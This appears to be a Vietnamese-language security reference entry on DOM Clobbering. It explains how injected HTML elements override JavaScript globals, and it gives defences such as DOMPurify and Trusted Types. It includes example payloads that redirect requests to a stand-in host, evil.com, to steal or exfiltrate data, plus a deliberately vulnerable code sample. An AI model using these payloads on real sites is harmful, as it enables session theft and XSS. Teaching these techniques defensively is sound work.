# DOM Clobbering

> **CWE**: CWE-79 | **Phân loại**: Cross-Site Scripting

## Kiến thức Nền tảng

Trong trình duyệt, cây DOM giống như sơ đồ bố trí của một ngôi nhà HTML. Để giúp lập trình viên dễ dàng tìm thấy các phòng (phần tử HTML), trình duyệt có một cơ chế tự động: bất kỳ phần tử nào có đặt tên bằng thuộc tính `id` hoặc `name` sẽ được đăng ký trực tiếp thành một biến toàn cục trong JavaScript (thông qua đối tượng `window` hoặc `document`). Cơ chế tiện lợi này vốn được giữ lại từ thời xa xưa để các trang web cũ không bị lỗi. Tuy nhiên, nó lại vô tình tạo ra một kẽ hở lớn khi cho phép các phần tử HTML đè lên hoặc "chiếm đoạt" tên của các biến JavaScript quan trọng mà ứng dụng đang vận hành.

```html
<!-- Normal named access behavior in browsers -->
<div id="greeting">Hello World</div>

<script>
  // Browser automatically creates window.greeting -> <div> element
  console.log(window.greeting);          // <div id="greeting">Hello World</div>
  console.log(window.greeting.toString()); // [object HTMLDivElement]
</script>
```

Với thẻ `<a>` hoặc `<area>`, thuộc tính `href` khiến `.toString()` trả về giá trị URL — đây là yếu tố then chốt trong nhiều chuỗi khai thác DOM Clobbering.

## Mô tả lỗ hổng

Lỗ hổng DOM Clobbering xảy ra khi ứng dụng web cho phép người dùng chèn mã HTML (ví dụ qua các khung viết bình luận) nhưng lại chủ quan nghĩ rằng chỉ cần chặn các thẻ chạy script `<script>` là đủ an toàn. Kẻ tấn công có thể khôn khéo tạo ra các thẻ HTML bình thường nhưng chứa các thuộc tính `id` hoặc `name` trùng tên với các biến cấu hình hay đường dẫn mà JavaScript của trang web đang dùng. Khi JavaScript chạy, thay vì đọc cấu hình chuẩn từ hệ thống, nó lại đọc nhầm dữ liệu độc hại từ chính thẻ HTML do kẻ tấn công chèn vào. Điều này có thể dẫn tới việc phá vỡ các chốt chặn bảo vệ, chuyển hướng ứng dụng đến các địa chỉ độc hại, hoặc gián tiếp kích hoạt các cuộc tấn công mã độc XSS.

## Cơ chế tấn công

**Kịch bản 1 — Ghi đè biến cấu hình đơn giản:**

```html
<!-- Attacker injects this HTML (passes sanitizer since no script tags) -->
<a id="configUrl" href="https://evil.com/steal">Click</a>
```

```javascript
// Vulnerable application code
// Developer expects configUrl to be a string variable
let endpoint = window.configUrl || "https://api.legit.com/data";

// After clobbering: endpoint = "https://evil.com/steal"
// because <a>.toString() returns href value
fetch(endpoint, { credentials: "include" });
```

**Kịch bản 2 — Clobbering thuộc tính lồng nhau bằng `<form>`:**

```html
<!-- Clobber window.config.url using form + input -->
<form id="config" name="config">
  <input name="url" value="https://evil.com/exfil">
</form>

<script>
  // window.config -> <form> element
  // window.config.url -> <input> element
  // window.config.url.value -> "https://evil.com/exfil"
  console.log(window.config.url.value); // attacker-controlled
</script>
```

**Kịch bản 3 — Bypass sanitizer để đạt XSS:**

```html
<!-- Clobber a security flag that guards innerHTML assignment -->
<div id="sanitizerEnabled"></div>
<!-- window.sanitizerEnabled is now truthy (DOM element), but not boolean true -->
<!-- If code does: if(!window.sanitizerEnabled) { skip sanitization } -->
<!-- Attacker can manipulate logic depending on how the flag is checked -->
```

## Biện pháp phòng thủ

- **Tóm tắt**: Tránh sử dụng biến toàn cục trên đối tượng window, sử dụng các biến có phạm vi giới hạn và áp dụng Trusted Types.
- **Các bước chi tiết**:
  - Không dùng biến toàn cục trên `window` — sử dụng `const`/`let` trong scope cục bộ hoặc module ES6.
  - Vệ sinh và kiểm duyệt DOM trước khi chèn bằng các thư viện như DOMPurify.
  - Sử dụng Trusted Types để kiểm soát các điểm chèn nhạy cảm (sinks).

## Code Example

```javascript
// ❌ VULNERABLE: Global variable can be clobbered
// If attacker injects <a id="analyticsEndpoint" href="https://evil.com">
let url = window.analyticsEndpoint || "/api/analytics";
navigator.sendBeacon(url, JSON.stringify(userData));

// ✅ SECURE: Use local constant with type validation
const ANALYTICS_ENDPOINT = "/api/analytics";

function sendAnalytics(data) {
  // Hardcoded constant cannot be clobbered
  const url = ANALYTICS_ENDPOINT;
  
  // Additional URL validation
  if (!url.startsWith("/") && !url.startsWith("https://trusted.com")) {
    throw new Error("Invalid analytics endpoint");
  }
  
  navigator.sendBeacon(url, JSON.stringify(data));
}
```

## Xem thêm

- [DOM-based XSS](../xss/dom-based/) — Lỗ hổng XSS dựa trên DOM.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/dom-based/dom-clobbering
- OWASP: https://owasp.org/www-community/attacks/DOM_Clobbering
- CWE: https://cwe.mitre.org/data/definitions/79.html
- HTML Spec Named Access: https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object

## Giải thích thuật ngữ

- **DOM Clobbering**: Ghi đè các đối tượng và biến JavaScript toàn cục thông qua thuộc tính HTML `id`/`name`.
- **DOM (Document Object Model)**: Mô hình đối tượng tài liệu cấu trúc phân cấp thể hiện nội dung trang web.
- **Named Access**: Cơ chế tự động truy cập phần tử HTML qua thuộc tính name/id như một biến JavaScript.
- **Sanitizer**: Thư viện hoặc công cụ làm sạch HTML để loại bỏ mã độc trước khi đưa lên trang.
- **Bypass**: Hành động vượt qua một cơ chế kiểm soát bảo mật.
